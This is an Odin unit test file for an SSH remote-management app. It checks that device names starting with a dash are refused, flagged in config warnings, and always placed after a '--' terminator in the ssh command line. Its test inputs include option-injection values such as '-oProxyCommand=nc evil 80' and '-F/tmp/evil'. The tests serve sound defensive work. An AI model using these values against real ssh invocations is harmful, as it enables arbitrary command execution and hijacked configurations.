package unit

// ─────────────────────────────────────────────────────────────────────────────
// app_inject_test.odin — T10 port of `unit_device_option_injection` (:928).
//
// P2-7: a device that starts with `-` is an OPTION, not a host.
//
// TWO INDEPENDENT LAYERS, BOTH ASSERTED
//
// Layer 1 is validation: `remote_is_valid` refuses `-F/tmp/evil`. That is
// the right place for the user-facing "no" and the warning.
//
// Layer 2 is the transport: the argv builder is called HERE with a hostile
// device DIRECTLY, validation bypassed on purpose, and the assertion is that
// `--` still sits immediately before the device — the position that makes
// ssh stop reading options. Validation is one refactor away from being
// skipped; the transport not being hijackable is the property that survives.
//
// Measured on this box with OpenSSH 10.5p1:
//   ssh -T … -- '-F/tmp/evil' 'echo x'  → hostname contains invalid characters
//   ssh -T …    '-F/tmp/evil' 'echo x'  → ssh reads /tmp/evil as its config
//
// The third assertion in each bypass row — "the device never appears BEFORE
// the terminator" — is what stops the guard going decorative: if `--` moved
// to the END of the argv, a check that only looks for "terminator exists"
// would stay green while protecting nothing.
// ─────────────────────────────────────────────────────────────────────────────

import "core:fmt"
import "core:strings"
import "core:testing"

import app "../../src/app"
import support "../support"

AU_BAD_TARGETS : []string = {
	"-F/tmp/evil",                // ssh -F: read an attacker-chosen CONFIG file
	"-oProxyCommand=nc evil 80",  // ssh -o: run an arbitrary command
	"-p2222",
	"-lroot",
	"-",
}

app_inject_battery_app_inject_leading_dash_device_is_refused :: proc(c: ^AU_Ctx) {
	for tt in AU_BAD_TARGETS {
		r := app.Remote{device = tt}
		reason := app.remote_invalid_reason(r)
		au_check(c, fmt.tprintf("device %q is refused", tt),
			!app.remote_is_valid(r), fmt.tprintf("reason=%q", reason))
		au_check(c, fmt.tprintf("…with a message that says WHY (option injection): %q", tt),
			strings.contains(reason, "OPTION"), fmt.tprintf("reason=%q", reason))
		au_check(c, fmt.tprintf("…and names the offending device: %q", tt),
			strings.contains(reason, tt), fmt.tprintf("reason=%q", reason))
	}
}
@(test)
app_inject_leading_dash_device_is_refused :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_leading_dash_device_is_refused(&__c)
}

app_inject_battery_app_inject_class_does_not_swallow_legal_targets :: proc(c: ^AU_Ctx) {
	// `@` mid-string is normal ssh syntax and `:` shows up in `host:port`
	// targets people write.
	good := []string{"build-box", "alice@workbox.example", "10.0.0.7", "hub.example"}
	for tt in good {
		r := app.Remote{device = tt}
		au_check(c, fmt.tprintf("legal device %q still passes", tt),
			app.remote_is_valid(r), app.remote_invalid_reason(r))
	}
}
@(test)
app_inject_class_does_not_swallow_legal_targets :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_class_does_not_swallow_legal_targets(&__c)
}

app_inject_battery_app_inject_discovery_drops_the_option_shaped_remote :: proc(c: ^AU_Ctx) {
	cfg := []app.Remote{app.Remote{device = "build-box"}, app.Remote{device = "-F/tmp/evil"}}
	kept := 0
	dropped := false
	for r in cfg {
		if app.remote_is_valid(r) {
			kept += 1
		} else if r.device == "-F/tmp/evil" {
			dropped = true
		}
	}
	au_eq_int(c, "the good remote survives discovery", kept, 1)
	au_check(c, "the option-shaped remote is dropped", dropped, "")
}
@(test)
app_inject_discovery_drops_the_option_shaped_remote :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_discovery_drops_the_option_shaped_remote(&__c)
}

app_inject_battery_app_inject_config_parser_warns_rather_than_skipping :: proc(c: ^AU_Ctx) {
	// A silently-dropped remote looks exactly like a remote that never existed.
	cfg_text := `{"remotes":["build-box","-F/tmp/evil"],"theme":"gruvbox-dark"}`
	cs := app.config_parse_json(cfg_text, "/tmp/hs-inject")
	au_eq_int(c, "config keeps the one legal remote", len(cs.remotes), 1)
	if len(cs.remotes) > 0 {
		au_eq(c, "config's surviving remote is the legal one",
			cs.remotes[0].device, "build-box")
	}
	au_check(c, "config WARNS about the option-shaped remote", len(cs.warnings) > 0,
		fmt.tprintf("warnings={}", len(cs.warnings)))
	warned := false
	for w in cs.warnings {
		if strings.contains(w, "OPTION") && strings.contains(w, "-F/tmp/evil") { warned = true }
	}
	au_check(c, "…and the warning names it and says OPTION", warned,
		fmt.tprintf("warnings={}", cs.warnings))
}
@(test)
app_inject_config_parser_warns_rather_than_skipping :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_config_parser_warns_rather_than_skipping(&__c)
}

app_inject_battery_app_inject_argv_terminator_holds_with_validation_bypassed :: proc(c: ^AU_Ctx) {
	bypass := []string{"-F/tmp/evil", "-oProxyCommand=nc evil 80", "-p2222", "-"}
	for tt in bypass {
		la := app.remote_list_argv(tt)
		host_at := len(app.SSH_BASE_ARGS) + 1
		au_check(c,
			fmt.tprintf("even with validation bypassed, remote_list_argv puts `--` before %q", tt),
			host_at < len(la) && la[host_at-1] == "--" && la[host_at] == tt,
			fmt.tprintf("token before the device={} device={}", la[host_at-1], la[host_at]))

		ca := app.control_argv(tt, app.delete_argv("hs-t-p1"))
		chost_at := len(app.SSH_BASE_ARGS) + 1
		au_check(c, fmt.tprintf("…and control_argv does too (cleanup path): %q", tt),
			chost_at < len(ca) && ca[chost_at-1] == "--" && ca[chost_at] == tt,
			fmt.tprintf("token before the device={} device={}", ca[chost_at-1], ca[chost_at]))

		// The device must appear AFTER the terminator and never before it.
		early := false
		for i in 0 ..< host_at-1 {
			if la[i] == tt { early = true }
		}
		au_check(c,
			fmt.tprintf("…and the hostile device never appears in the option slots: %q", tt),
			!early, fmt.tprintf("argv before the terminator does not contain it"))
	}
}
@(test)
app_inject_argv_terminator_holds_with_validation_bypassed :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_argv_terminator_holds_with_validation_bypassed(&__c)
}

app_inject_battery_app_inject_terminator_is_structural :: proc(c: ^AU_Ctx) {
	// The terminator is part of SSH_BASE_ARGS, in the LAST slot, so a future
	// builder cannot emit "base args + device" without it. That structural
	// claim is what keeps this from silently decaying.
	au_eq(c, "SSH_BASE_ARGS ends with the option terminator",
		app.SSH_BASE_ARGS[len(app.SSH_BASE_ARGS)-1], "--")
	au_check(c, "…and every ssh argv we build therefore has `--` immediately before the host",
		app.remote_list_argv("box.example")[len(app.SSH_BASE_ARGS)+1] == "box.example" &&
			app.remote_list_argv("box.example")[len(app.SSH_BASE_ARGS)] == "--",
		fmt.tprintf("argv={}", au_argv_text(app.remote_list_argv("box.example"))))
}
@(test)
app_inject_terminator_is_structural :: proc(t: ^testing.T) {
	__c := au_live(t)
	app_inject_battery_app_inject_terminator_is_structural(&__c)
}

